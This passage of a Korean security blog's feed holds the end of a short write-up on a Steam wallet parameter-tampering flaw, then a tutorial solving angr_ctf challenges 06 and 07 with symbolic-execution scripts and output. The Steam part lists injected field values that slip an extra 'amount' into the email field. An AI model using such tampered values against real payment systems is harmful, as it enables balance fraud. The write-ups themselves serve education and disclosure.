&#xC870;&#xC791;&#xD558;&#xBA74; Hash&#xAC12;&#xC740; &#xADF8;&#xB300;&#xB85C; &#xB454; &#xCC44;&#xB85C; &#xD30C;&#xB77C;&#xBBF8;&#xD130;&#xB97C; &#xC870;&#xC791;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><ul><li><code>amount=2000</code>&#xB97C; <code>amount2=000</code>&#xC73C;&#xB85C; &#xC870;&#xC791;</li><li><code>CustomerEmail</code>&#xD544;&#xB4DC;&#xC640; &#xADF8; &#xAC12;&#xC744; <code>CustomerEmail=aaa&amp;amount=100&amp;ab=c%40bbb</code>&#xC73C;&#xB85C; &#xC870;&#xC791;</li></ul><p>&#xCDA9;&#xC804;&#xB420; &#xC794;&#xC561;&#xC744; &#xB73B;&#xD558;&#xB294; <code>amount</code>&#xD544;&#xB4DC;&#xB97C; &#xC6D0;&#xD558;&#xB294; &#xAC12;&#xC73C;&#xB85C; &#xC870;&#xC791;&#xD560; &#xC218; &#xC788;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xC2E4;&#xC81C; &#xC9C0;&#xBD88; &#xAE08;&#xC561;&#xACFC; &#xCDA9;&#xC804;&#xB418;&#xB294; &#xC794;&#xC561;&#xC758; &#xCC28;&#xC774;&#xB97C; &#xBC1C;&#xC0DD;&#xC2DC;&#xD0AC; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. </p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Fabu1ous</tag>
      
      <tag>post</tag>
      
      <tag>parmeter modify</tag>
      
      <tag>steam</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[Research] 핵린이의 angr 정복기 - (4) angr_ctf part.2</title>
    <link href="/2021/08/15/j0ker/angr_part4/"/>
    <url>/2021/08/15/j0ker/angr_part4/</url>
    
    <content type="html"><![CDATA[<h1 id="&#xD575;&#xB9B0;&#xC774;&#xC758;-angr-&#xC815;&#xBCF5;&#xAE30;-4-angr-ctf-part-2"><a href="#&#xD575;&#xB9B0;&#xC774;&#xC758;-angr-&#xC815;&#xBCF5;&#xAE30;-4-angr-ctf-part-2" class="headerlink" title="&#xD575;&#xB9B0;&#xC774;&#xC758; angr &#xC815;&#xBCF5;&#xAE30; - (4) angr_ctf part.2"></a>&#xD575;&#xB9B0;&#xC774;&#xC758; angr &#xC815;&#xBCF5;&#xAE30; - (4) angr_ctf part.2</h1><p><img src="/2021/08/15/j0ker/angr_part4/5jnh8a.jpg" alt="5jnh8a.jpg"></p><h1 id="&#xC774;&#xC804;-&#xAE00;-&#xBC14;&#xB85C;&#xAC00;&#xAE30;"><a href="#&#xC774;&#xC804;-&#xAE00;-&#xBC14;&#xB85C;&#xAC00;&#xAE30;" class="headerlink" title="&#xC774;&#xC804; &#xAE00; &#xBC14;&#xB85C;&#xAC00;&#xAE30;"></a>&#xC774;&#xC804; &#xAE00; &#xBC14;&#xB85C;&#xAC00;&#xAE30;</h1><p><a href="https://hackyboiz.github.io/2021/07/10/j0ker/angr_part1/">[Research] &#xD575;&#xB9B0;&#xC774;&#xC758; angr &#xC815;&#xBCF5;&#xAE30; - (1) &#xC2DC;&#xC791;</a></p><p><a href="https://hackyboiz.github.io/2021/07/21/j0ker/angr_part2/">[Research] &#xD575;&#xB9B0;&#xC774;&#xC758; angr &#xC815;&#xBCF5;&#xAE30; - (2) Symbolic Execution</a></p><p><a href="https://hackyboiz.github.io/2021/08/04/j0ker/angr_part3/">[Research] &#xD575;&#xB9B0;&#xC774;&#xC758; angr &#xC815;&#xBCF5;&#xAE30; - (3) angr_ctf part.1</a></p><p>[Research] &#xD575;&#xB9B0;&#xC774;&#xC758; angr &#xC815;&#xBCF5;&#xAE30; - (4) angr_ctf part.2 &#x2190; Here!</p><h1 id="&#xC778;&#xC0AC;&#xB9D0;"><a href="#&#xC778;&#xC0AC;&#xB9D0;" class="headerlink" title="&#xC778;&#xC0AC;&#xB9D0;"></a>&#xC778;&#xC0AC;&#xB9D0;</h1><p>&#xC548;&#xB155;&#xD558;&#xC138;&#xC694;. j0ker &#xC785;&#xB2C8;&#xB2E4;! &#xC774;&#xBC88;&#xC5D0;&#xB3C4; angr_ctf &#xBB38;&#xC81C;&#xB4E4;&#xC744; &#xD480;&#xC5B4;&#xBCF4;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;. &#xADFC;&#xB370; &#xC2DC;&#xB9AC;&#xC988;&#xAC00; &#xB9E4;&#xC6B0; &#xAE38;&#xC5B4;&#xC9C8;&#xAC70; &#xAC19;&#xC740; &#xC608;&#xAC10;&#xC740; &#xD2C0;&#xB9AC;&#xC9C0; &#xC54A;&#xC558;&#xB2E4;&#xB294;&#xAC70;&#x2026; &#xC0DD;&#xAC01;&#xBCF4;&#xB2E4; &#xC2DC;&#xB9AC;&#xC988;&#xAC00; &#xB354; &#xAE38;&#xC5B4;&#xC9C8; &#xC218; &#xC788;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;&#x2026; &#xADF8;&#xB9AC;&#xACE0; &#xC0DD;&#xAC01;&#xBCF4;&#xB2E4; &#xB354; &#xACE0;&#xD1B5;&#xC2A4;&#xB7FD;&#x2026;. &#xD558;&#xD558;</p><h1 id="06-angr-symbolic-dynamic-memory"><a href="#06-angr-symbolic-dynamic-memory" class="headerlink" title="06_angr_symbolic_dynamic_memory"></a>06_angr_symbolic_dynamic_memory</h1><p>&#xC55E;&#xC5D0; 5&#xBC88; &#xBB38;&#xC81C;&#xC5D0;&#xC11C;&#xB294; &#xC804;&#xC5ED;&#xBCC0;&#xC218;&#xC5D0; &#xB300;&#xD55C; &#xC2EC;&#xBCFC;&#xC744; &#xC9C0;&#xC815;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;. &#xADF8;&#xB9AC;&#xACE0; &#xC81C;&#xBAA9;&#xC5D0; &#xB2E4;&#xC774;&#xB098;&#xBBF9; &#xBA54;&#xBAA8;&#xB9AC;&#xAC00; &#xB098;&#xC628;&#xAC83;&#xC744; &#xBCF4;&#xB2C8; &#xC790;&#xC5F0;&#xC2A4;&#xB7FD;&#xAC8C; &#xC774;&#xBC88;&#xC5D0;&#xB294; &#xD799;&#xC5D0; &#xC2EC;&#xBCFC;&#xC744; &#xC9C0;&#xC815;&#xD558;&#xB294; &#xAD6C;&#xB098;&#xB77C;&#xACE0; &#xCD94;&#xCE21;&#xD574;&#xBCFC; &#xC218; &#xC788;&#xACA0;&#xB124;&#xC694;. &#xBC14;&#xB85C; &#xBC14;&#xC774;&#xB108;&#xB9AC; &#xAE4C;&#xBCF4;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="/2021/08/15/j0ker/angr_part4/Untitled.png" alt="angr_part4/Untitled.png"></p><p>&#xC5ED;&#xC2DC; &#xD799;&#xC744; &#xC0AC;&#xC6A9;&#xD569;&#xB2C8;&#xB2E4;. &#xB450; &#xAC1C;&#xC758; &#xBCC0;&#xC218;&#xAC00; &#xD799;&#xC744; &#xC0AC;&#xC6A9;&#xD558;&#xACE0; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC55E;&#xC5D0;&#xC11C;&#xC640; &#xB9C8;&#xCC2C;&#xAC00;&#xC9C0;&#xACE0; &#xBD84;&#xC11D;&#xC740; scanf &#xB4A4;&#xC5D0;&#xC11C;&#xBD80;&#xD130; &#xC2DC;&#xC791;&#xD574;&#xC57C;&#xACA0;&#xB124;&#xC694;. &#xC774; &#xBB38;&#xC81C;&#xB97C; &#xB4E4;&#xC5EC;&#xB2E4;&#xBCF4;&#xBA74; &#xC55E;&#xC5D0;&#xC11C; &#xC2A4;&#xD0DD;&#xAD00;&#xB828;&#xB41C; &#xBB38;&#xC81C;&#xB97C; &#xD480;&#xC5C8;&#xC744; &#xB54C;&#xC640; &#xAC19;&#xC774; angr&#xB294; &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC744; &#xBD84;&#xC11D;&#xD560; &#xB54C; <code>malloc</code>&#xC758; &#xACB0;&#xACFC;&#xAC12;, &#xC989; &#xD799;&#xC774; &#xC5B4;&#xB514;&#xC5D0; &#xD560;&#xB2F9;&#xB418;&#xC5B4; &#xC788;&#xB294;&#xC9C0; &#xADF8; &#xC8FC;&#xC18C;&#xB97C; &#xBAA8;&#xB978;&#xB2E4;&#xB294; &#xAC83;&#xC785;&#xB2C8;&#xB2E4;. &#xADF8;&#xB807;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xC774; &#xBB38;&#xC81C;&#xC5D0;&#xC11C;&#xB294; &#xAC00;&#xC0C1;&#xC758; &#xD799; &#xC8FC;&#xC18C;&#xB97C; &#xC6B0;&#xB9AC;&#xAC00; &#xC784;&#xC758;&#xB85C; &#xC9C0;&#xC815;&#xC744; &#xD574;&#xC918;&#xC57C; &#xD569;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs python">fake_heap_address0 = <span class="hljs-number">0x41414140</span>pointer_to_malloc_memory_address0 = <span class="hljs-number">0x0ABCC8A4</span>initial_state.memory.store(pointer_to_malloc_memory_address0, fake_heap_address0, endness=project.arch.memory_endness)fake_heap_address1 = <span class="hljs-number">0x41414150</span>pointer_to_malloc_memory_address1 = <span class="hljs-number">0x0ABCC8AC</span>initial_state.memory.store(pointer_to_malloc_memory_address1, fake_heap_address1, endness=project.arch.memory_endness)</code></pre><p>&#xAC01;&#xAC01; &#xBCC0;&#xC218;&#xC758; &#xD06C;&#xAE30;&#xAC00; 9&#xC774;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; alignment&#xB85C; &#xC778;&#xD574; &#xC544;&#xB9C8; 16&#xBC14;&#xC774;&#xD2B8;&#xC529; &#xD560;&#xB2F9;&#xC774; &#xB420;&#xAC81;&#xB2C8;&#xB2E4;. &#xC800;&#xB294; &#xC77C;&#xB2E8; 0x41414140&#xACFC; 0x41414150&#xC73C;&#xB85C; 16&#xBC14;&#xC774;&#xD2B8; &#xAC04;&#xACA9;&#xC73C;&#xB85C; &#xC124;&#xC815;&#xD574; &#xC8FC;&#xC5C8;&#xACE0; &#xD799; &#xC8FC;&#xC18C;&#xB97C; &#xC800;&#xC7A5;&#xD558;&#xACE0; &#xC788;&#xB294; &#xC804;&#xC5ED; &#xBCC0;&#xC218;&#xC758; &#xC8FC;&#xC18C;&#xB4E4;&#xC744; &#xAC01;&#xAC01; <code>initial_state</code>&#xC5D0; &#xC124;&#xC815;&#xD574;&#xC8FC;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC544;&#xB9C8; &#xC8FC;&#xC18C;&#xB294; &#xB2E4;&#xB974;&#xAC8C; &#xBC14;&#xAFB8;&#xACE0; &#xAC04;&#xACA9;&#xB9CC; &#xC2E0;&#xACBD;&#xC4F0;&#xBA74; &#xD070; &#xBB38;&#xC81C;&#xB294; &#xC5C6;&#xC744; &#xB4EF; &#xC2BE;&#xC2B5;&#xB2C8;&#xB2E4;. &#xB2E4;&#xB978; &#xBD80;&#xBD84;&#xC740; &#xC55E; &#xBB38;&#xC81C;&#xB4E4;&#xACFC; &#xB611;&#xAC19;&#xB124;&#xC694;!</p><h2 id="sol06-py"><a href="#sol06-py" class="headerlink" title="sol06.py"></a>sol06.py</h2><pre><code class="hljs python"><span class="hljs-keyword">import</span> angr<span class="hljs-keyword">import</span> claripy<span class="hljs-keyword">import</span> sys<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">main</span>(<span class="hljs-params">argv</span>):</span>  path_to_binary = argv[<span class="hljs-number">1</span>]  project = angr.Project(path_to_binary)  start_address = <span class="hljs-number">0x08048696</span>  initial_state = project.factory.blank_state(addr=start_address)  password0 = claripy.BVS(<span class="hljs-string">&apos;password0&apos;</span>, <span class="hljs-number">64</span>)  password1 = claripy.BVS(<span class="hljs-string">&apos;password1&apos;</span>, <span class="hljs-number">64</span>)    fake_heap_address0 = <span class="hljs-number">0x41414140</span>  pointer_to_malloc_memory_address0 = <span class="hljs-number">0x0ABCC8A4</span>  initial_state.memory.store(pointer_to_malloc_memory_address0, fake_heap_address0, endness=project.arch.memory_endness)  fake_heap_address1 = <span class="hljs-number">0x41414150</span>  pointer_to_malloc_memory_address1 = <span class="hljs-number">0x0ABCC8AC</span>  initial_state.memory.store(pointer_to_malloc_memory_address1, fake_heap_address1, endness=project.arch.memory_endness)    initial_state.memory.store(fake_heap_address0, password0)  initial_state.memory.store(fake_heap_address1, password1)    simulation = project.factory.simgr(initial_state)  <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">is_successful</span>(<span class="hljs-params">state</span>):</span>    stdout_output = state.posix.dumps(sys.stdout.fileno())    <span class="hljs-keyword">return</span> (<span class="hljs-string">&apos;Good Job&apos;</span> <span class="hljs-keyword">in</span> stdout_output.decode(<span class="hljs-string">&apos;ascii&apos;</span>))  <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">should_abort</span>(<span class="hljs-params">state</span>):</span>    stdout_output = state.posix.dumps(sys.stdout.fileno())    <span class="hljs-keyword">return</span> (<span class="hljs-string">&apos;Try again&apos;</span> <span class="hljs-keyword">in</span> stdout_output.decode(<span class="hljs-string">&apos;ascii&apos;</span>))  simulation.explore(find=is_successful, avoid=should_abort)  <span class="hljs-keyword">if</span> simulation.found:    solution_state = simulation.found[<span class="hljs-number">0</span>]    solution0 = solution_state.se.eval(password0, cast_to=bytes)    solution1 = solution_state.se.eval(password1, cast_to=bytes)        solution = <span class="hljs-string">&apos;{} {}&apos;</span>.format(solution0, solution1)    print(solution)  <span class="hljs-keyword">else</span>:    <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">&apos;Could not find the solution&apos;</span>)<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&apos;__main__&apos;</span>:  main(sys.argv)</code></pre><pre><code class="hljs python">j0ker@angr:~/angr_ctf/dist$ python3 sol06.py <span class="hljs-number">06</span>_angr_symbolic_dynamic_memory WARNING | <span class="hljs-number">2021</span><span class="hljs-number">-08</span><span class="hljs-number">-15</span> <span class="hljs-number">05</span>:<span class="hljs-number">35</span>:<span class="hljs-number">25</span>,<span class="hljs-number">145</span> | angr.storage.memory_mixins.bvv_conversion_mixin | Unknown size <span class="hljs-keyword">for</span> memory data <span class="hljs-number">0x41414140</span>. Default to arch.bits.WARNING | <span class="hljs-number">2021</span><span class="hljs-number">-08</span><span class="hljs-number">-15</span> <span class="hljs-number">05</span>:<span class="hljs-number">35</span>:<span class="hljs-number">25</span>,<span class="hljs-number">145</span> | angr.storage.memory_mixins.bvv_conversion_mixin | Unknown size <span class="hljs-keyword">for</span> memory data <span class="hljs-number">0x41414150</span>. Default to arch.bits.WARNING | <span class="hljs-number">2021</span><span class="hljs-number">-08</span><span class="hljs-number">-15</span> <span class="hljs-number">05</span>:<span class="hljs-number">35</span>:<span class="hljs-number">25</span>,<span class="hljs-number">150</span> | angr.storage.memory_mixins.default_filler_mixin | The program <span class="hljs-keyword">is</span> accessing memory <span class="hljs-keyword">or</span> registers <span class="hljs-keyword">with</span> an unspecified value. This could indicate unwanted behavior.WARNING | <span class="hljs-number">2021</span><span class="hljs-number">-08</span><span class="hljs-number">-15</span> <span class="hljs-number">05</span>:<span class="hljs-number">35</span>:<span class="hljs-number">25</span>,<span class="hljs-number">150</span> | angr.storage.memory_mixins.default_filler_mixin | angr will cope <span class="hljs-keyword">with</span> this by generating an unconstrained symbolic variable <span class="hljs-keyword">and</span> continuing. You can resolve this by:WARNING | <span class="hljs-number">2021</span><span class="hljs-number">-08</span><span class="hljs-number">-15</span> <span class="hljs-number">05</span>:<span class="hljs-number">35</span>:<span class="hljs-number">25</span>,<span class="hljs-number">150</span> | angr.storage.memory_mixins.default_filler_mixin | <span class="hljs-number">1</span>) setting a value to the initial stateWARNING | <span class="hljs-number">2021</span><span class="hljs-number">-08</span><span class="hljs-number">-15</span> <span class="hljs-number">05</span>:<span class="hljs-number">35</span>:<span class="hljs-number">25</span>,<span class="hljs-number">150</span> | angr.storage.memory_mixins.default_filler_mixin | <span class="hljs-number">2</span>) adding the state option ZERO_FILL_UNCONSTRAINED_{MEMORY,REGISTERS}, to make unknown regions hold nullWARNING | <span class="hljs-number">2021</span><span class="hljs-number">-08</span><span class="hljs-number">-15</span> <span class="hljs-number">05</span>:<span class="hljs-number">35</span>:<span class="hljs-number">25</span>,<span class="hljs-number">150</span> | angr.storage.memory_mixins.default_filler_mixin | <span class="hljs-number">3</span>) adding the state option SYMBOL_FILL_UNCONSTRAINED_{MEMORY,REGISTERS}, to suppress these messages.WARNING | <span class="hljs-number">2021</span><span class="hljs-number">-08</span><span class="hljs-number">-15</span> <span class="hljs-number">05</span>:<span class="hljs-number">35</span>:<span class="hljs-number">25</span>,<span class="hljs-number">150</span> | angr.storage.memory_mixins.default_filler_mixin | Filling register ebp <span class="hljs-keyword">with</span> <span class="hljs-number">4</span> unconstrained bytes referenced <span class="hljs-keyword">from</span> <span class="hljs-number">0x8048699</span> (main+<span class="hljs-number">0x8d</span> <span class="hljs-keyword">in</span> <span class="hljs-number">06</span>_angr_symbolic_dynamic_memory (<span class="hljs-number">0x8048699</span>))WARNING | <span class="hljs-number">2021</span><span class="hljs-number">-08</span><span class="hljs-number">-15</span> <span class="hljs-number">05</span>:<span class="hljs-number">35</span>:<span class="hljs-number">26</span>,<span class="hljs-number">815</span> | angr.storage.memory_mixins.default_filler_mixin | Filling memory at <span class="hljs-number">0x41414148</span> <span class="hljs-keyword">with</span> <span class="hljs-number">8</span> unconstrained bytes referenced <span class="hljs-keyword">from</span> <span class="hljs-number">0xac8a520</span> (strncmp+<span class="hljs-number">0x0</span> <span class="hljs-keyword">in</span> libc.so<span class="hljs-number">.6</span> (<span class="hljs-number">0x8a520</span>))WARNING | <span class="hljs-number">2021</span><span class="hljs-number">-08</span><span class="hljs-number">-15</span> <span class="hljs-number">05</span>:<span class="hljs-number">35</span>:<span class="hljs-number">26</span>,<span class="hljs-number">816</span> | angr.storage.memory_mixins.default_filler_mixin | Filling memory at <span class="hljs-number">0x41414158</span> <span class="hljs-keyword">with</span> <span class="hljs-number">105</span> unconstrained bytes referenced <span class="hljs-keyword">from</span> <span class="hljs-number">0xac8a520</span> (strncmp+<span class="hljs-number">0x0</span> <span class="hljs-keyword">in</span> libc.so<span class="hljs-number">.6</span> (<span class="hljs-number">0x8a520</span>))WARNING | <span class="hljs-number">2021</span><span class="hljs-number">-08</span><span class="hljs-number">-15</span> <span class="hljs-number">05</span>:<span class="hljs-number">35</span>:<span class="hljs-number">28</span>,<span class="hljs-number">576</span> | angr.storage.memory_mixins.default_filler_mixin | Filling memory at <span class="hljs-number">0x414141c1</span> <span class="hljs-keyword">with</span> <span class="hljs-number">16</span> unconstrained bytes referenced <span class="hljs-keyword">from</span> <span class="hljs-number">0xac8a520</span> (strncmp+<span class="hljs-number">0x0</span> <span class="hljs-keyword">in</span> libc.so<span class="hljs-number">.6</span> (<span class="hljs-number">0x8a520</span>))CRITICAL | <span class="hljs-number">2021</span><span class="hljs-number">-08</span><span class="hljs-number">-15</span> <span class="hljs-number">05</span>:<span class="hljs-number">35</span>:<span class="hljs-number">30</span>,<span class="hljs-number">932</span> | angr.sim_state | The name state.se <span class="hljs-keyword">is</span> deprecated; please use state.solver.<span class="hljs-string">b&apos;UBDKLMBV&apos;</span> <span class="hljs-string">b&apos;UNOERNYS&apos;</span>j0ker@angr:~/angr_ctf/dist$ ./<span class="hljs-number">06</span>_angr_symbolic_dynamic_memory Enter the password: UBDKLMBVUNOERNYSGood Job.j0ker@angr:~/angr_ctf/dist$</code></pre><h1 id="07-angr-symbolic-file"><a href="#07-angr-symbolic-file" class="headerlink" title="07_angr_symbolic_file"></a>07_angr_symbolic_file</h1><p>&#xC774;&#xC81C; &#xB2E4;&#xB4E4; &#xB208;&#xCE58; &#xCC44;&#xC2DC;&#xACA0;&#xC8E0;? &#xB108;&#xBB34; &#xBED4;&#xD558;&#xAC8C; &#xD30C;&#xC77C;&#xC744; &#xC2EC;&#xBCFC;&#xB85C; &#xC9C0;&#xC815;&#xD558;&#xB294; &#xBB38;&#xC81C;&#xACA0;&#xB124;&#xC694; &#x314B;&#x314B; &#xD558;&#xD558; &#xC774;&#xCBE4;&#xB418;&#xBA74; &#xB208;&#xAC10;&#xACE0;&#xB3C4; &#xBB38;&#xC81C; &#xC720;&#xD615;&#xC740; &#xB9DE;&#xCD94;&#xC2E4; &#xC218; &#xC788;&#xC73C;&#xC2E4; &#xAC81;&#xB2C8;&#xB2E4;.</p><p><img src="/2021/08/15/j0ker/angr_part4/Untitled1.png" alt="angr_part4/Untitled 1.png"></p><p>&#xC77C;&#xB2E8; &#xBA3C;&#xC800; 64&#xBC14;&#xC774;&#xD2B8; &#xC785;&#xB825;&#xAC12;&#xC744; &#xBC1B;&#xACE0; &#xD30C;&#xC77C;&#xC5D0; &#xC501;&#xB2C8;&#xB2E4;. &#xC911;&#xAC04;&#xC5D0; <code>ignore_me</code>&#xB77C;&#xB294; &#xD568;&#xC218;&#xAC00; &#xC788;&#xB294; &#xAC78; &#xBCF4;&#xB2C8; &#xC800; &#xD568;&#xC218; &#xB4A4;&#xBD80;&#xD130; &#xBD84;&#xC11D;&#xD558;&#xB3C4;&#xB85D; &#xB9CC;&#xB4E4;&#xBA74; &#xB420;&#xAC70; &#xAC19;&#xB124;&#xC694;. &#xADF8;&#xB9AC;&#xACE0; &#xD30C;&#xC77C;&#xC744; &#xC4F0;&#xACE0; &#xC9C0;&#xC6B4; &#xB2E4;&#xC74C; &#xADF8; &#xAC12;&#xC73C;&#xB85C; &#xBB54;&#xAC00; &#xD55C; &#xB2E4;&#xC74C;&#xC5D0; &#xBB38;&#xC790;&#xC5F4;&#xACFC; &#xBE44;&#xAD50;&#xD569;&#xB2C8;&#xB2E4;. &#xCC98;&#xC74C;&#xC5D0; &#xC0DD;&#xAC01;&#xD588;&#xB358;&#xAC70;&#xB294; &#xBA54;&#xBAA8;&#xB9AC; &#xBB38;&#xC81C;&#xCC98;&#xB7FC; <code>buffer</code> &#xC8FC;&#xC18C;&#xB97C; &#xBA54;&#xBAA8;&#xB9AC; &#xC2EC;&#xBCFC;&#xB85C; &#xC9C0;&#xC815;&#xD558;&#xACE0; &#xD480;&#xAE4C;&#xD588;&#xB294;&#xB370;, &#xBB38;&#xC81C; &#xC2A4;&#xD06C;&#xB9BD;&#xD2B8;&#xB97C; &#xBCF4;&#xB2C8; &#xADF8;&#xB807;&#xAC8C; &#xD480; &#xC218; &#xC788;&#xC9C0;&#xB9CC; &#xC81C;&#xBC1C; &#xBB38;&#xC81C; &#xC758;&#xB3C4;&#xC5D0; &#xB530;&#xB77C; &#xB2EC;&#xB77C;&#xACE0; &#xD569;&#xB2C8;&#xB2E4; &#x314B;&#x314B;&#x314B; &#xADF8;&#xB7FC; &#xC2A4;&#xD06C;&#xB9BD;&#xD2B8;&#xC5D0; &#xB530;&#xB77C; &#xBB38;&#xC81C;&#xB97C; &#xD480;&#xC5B4;&#xBCF4;&#xB3C4;&#xB85D; &#xD569;&#xC2DC;&#xB2E4;. &#xC77C;&#xB2E8; &#xD30C;&#xC77C; &#xC774;&#xB984;&#xACFC; &#xC0AC;&#xC774;&#xC988;&#xB97C; &#xC124;&#xC815;&#xD569;&#xB2C8;&#xB2E4;. &#xC774;&#xAC70;&#xB294; &#xBC14;&#xC774;&#xB108;&#xB9AC;&#xB97C; &#xAE4C;&#xBA74; &#xB2E4; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xC8E0;?</p><p>&#xADF8;&#xB7F0; &#xB2E4;&#xC74C; &#xC774;&#xC81C; &#xD30C;&#xC77C;&#xC5D0; &#xC2EC;&#xBCFC;&#xC744; &#xC124;&#xC815;&#xD569;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs python">symbolic_file_backing_memory = angr.state_plugins.SimSymbolicMemory()symbolic_file_backing_memory.set_state(initial_state)password = claripy.BVS(<span class="hljs-string">&apos;password&apos;</span>, symbolic_file_size_bytes * <span class="hljs-number">8</span>)symbolic_file_backing_memory.store(address_of_buffer, password)file_options = <span class="hljs-string">&apos;r&apos;</span>password_file = angr.storage.SimFile(filename, file_options, content=symbolic_file_backing_memory, size=symbolic_file_size_bytes)symbolic_filesystem = {    filename : password_file  }initial_state.posix.fs = symbolic_filesystem</code></pre><p><code>SimSymbolicMemory</code>&#xB97C; &#xD1B5;&#xD574; &#xBA54;&#xBAA8;&#xB9AC;&#xC5D0; &#xC2EC;&#xBCFC;&#xC744; &#xC124;&#xC815;&#xD569;&#xB2C8;&#xB2E4;? &#xC65C;&#xC8E0;???</p><p>&#xC124;&#xBA85;&#xC744; &#xBCF4;&#xBA74; &#xB9AC;&#xB205;&#xC2A4;&#xC5D0;&#xC11C; &#xD30C;&#xC77C;&#xC740; &#xC2DC;&#xD000;&#xC15C; &#xB370;&#xC774;&#xD130;&#xC758; &#xC2A4;&#xD2B8;&#xB9BC;&#xC774;&#xB77C;&#xACE0; &#xD569;&#xB2C8;&#xB2E4;. &#xAF2D; &#xD30C;&#xC77C;&#xC77C; &#xD544;&#xC694;&#xB294; &#xC5C6;&#xACE0; &#xB124;&#xD2B8;&#xC6CC;&#xD06C;&#xB098; &#xB2E4;&#xB978; &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC758; &#xACB0;&#xACFC;&#xAC12;&#xC774; &#xB420; &#xC218;&#xB3C4; &#xC788;&#xB2E4;&#xACE0; &#xD558;&#xB294;&#xB370;&#xC694;. &#xC554;&#xD2BC; &#xBB34;&#xC5C7;&#xC778;&#xAC00;&#xB97C; &#xBA54;&#xBAA8;&#xB9AC;&#xC5D0; &#xB9E4;&#xD551;&#xD574;&#xC8FC;&#xB294; &#xB290;&#xB08C;&#xC778;&#xAC70; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;. &#xADF8;&#xB9AC;&#xACE0; &#xD574;&#xB2F9; &#xBA54;&#xBAA8;&#xB9AC;&#xC5D0; &#xC2EC;&#xBCFC;&#xC744; &#xC9C0;&#xC815;&#xD558;&#xAD6C;&#xC694;. <code>SimFile</code> &#xD568;&#xC218;&#xB97C; &#xD1B5;&#xD574; &#xD30C;&#xC77C;&#xC744; &#xC2DC;&#xBBAC;&#xB808;&#xC774;&#xC158;&#xD574;&#xC8FC;&#xACE0; &#xD30C;&#xC77C; &#xC774;&#xB984;&#xACFC; &#xB9E4;&#xD551;&#xC744; &#xC2DC;&#xCF1C;&#xC90D;&#xB2C8;&#xB2E4;. &#xC774;&#xB807;&#xAC8C;&#xD558;&#xBA74; &#xB05D;&#xC778;&#xAC70; &#xAC19;&#xB124;&#xC694;! &#xADF8;&#xB7FC; &#xB3CC;&#xB824;&#xBD05;&#xC2DC;&#xB2E4;!</p><pre><code class="hljs python">j0ker@angr:~/angr_ctf/dist$ ./<span class="hljs-number">06</span>_angr_symbolic_dynamic_memory Enter the password: UBDKLMBVUNOERNYSGood Job.j0ker@angr:~/angr_ctf/dist$ python3 scaffold07.py <span class="hljs-number">07</span>_angr_symbolic_file WARNING | 2021-08-15 05:39:36,180 | angr.storage.memory_mixins.bvv_conversion_mixin | Encoding unicode string for memory as utf-8. Did you mean to use a bytestring?Traceback (most recent call last):  File <span class="hljs-string">&quot;scaffold07.py&quot;</span>, line <span class="hljs-number">130</span>, <span class="hljs-keyword">in</span> &lt;module&gt;    main(sys.argv)  File <span class="hljs-string">&quot;scaffold07.py&quot;</span>, line <span class="hljs-number">47</span>, <span class="hljs-keyword">in</span> main    symbolic_file_backing_memory = angr.state_plugins.SimSymbolicMemory()AttributeError: module <span class="hljs-string">&apos;angr.state_plugins&apos;</span> has no attribute <span class="hljs-string">&apos;SimSymbolicMemory&apos;</span></code></pre><p>???????????????????????????????????? &#xC5C6;&#xB2E4;&#xACE0;?????? &#xC65C;&#xC5C6;&#xB294;&#xB370;???????</p><p>&#xD558;&#xC544; &#xC774; &#xB54C;&#xBD80;&#xD130; &#xBA58;&#xD0C8;&#xC774; &#xB098;&#xAC00;&#xAE30; &#xC2DC;&#xC791;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;. &#xD558;&#xD558; &#xC774;&#xB7F0; &#xACE0;&#xB09C; &#xC5C6;&#xC774;&#xB3C4; &#xB0B4; &#xC778;&#xC0DD;&#xC740; &#xCDA9;&#xBD84;&#xD788; &#xACE0;&#xD1B5;&#xC2A4;&#xB7EC;&#xC6B4;&#xAC70; &#xAC19;&#xC740;&#xB370;&#x2026;</p><p>&#xC554;&#xD2BC; &#xC774; &#xBB38;&#xC81C;&#xB97C; &#xACE0;&#xCE58;&#xAE30; &#xC704;&#xD574; &#xAC80;&#xC0C9;&#xC744; &#xC880; &#xD574;&#xBCF4;&#xB2E4;&#xAC00; &#xC544;&#xB798; &#xAE00;&#xC744; &#xCC3E;&#xAC8C; &#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><a href="https://jasper.la/posts/angr-9-simfile-without-simsymbolicmemory/">Angr 9 SimFile without SimSymbolicMemory</a></p><p>&#xC774; &#xAE00;&#xC744; &#xBCF4;&#xBA74; &#xC774; angr_ctf&#xAC00; &#xB9CC;&#xB4E4;&#xC5B4;&#xC9C4;&#xC9C0; &#xB9E4;&#xC6B0; &#xC624;&#xB798;&#xB418;&#xC5C8;&#xACE0; angr&#xB3C4; &#xC5C5;&#xB370;&#xC774;&#xD2B8;&#xB418;&#xBA74;&#xC11C; &#xAE30;&#xB2A5;&#xC774; &#xD1B5;&#xD569;&#xB418;&#xACE0; &#xAD6C;&#xC870;&#xD654;&#xB418;&#xBA74;&#xC11C; 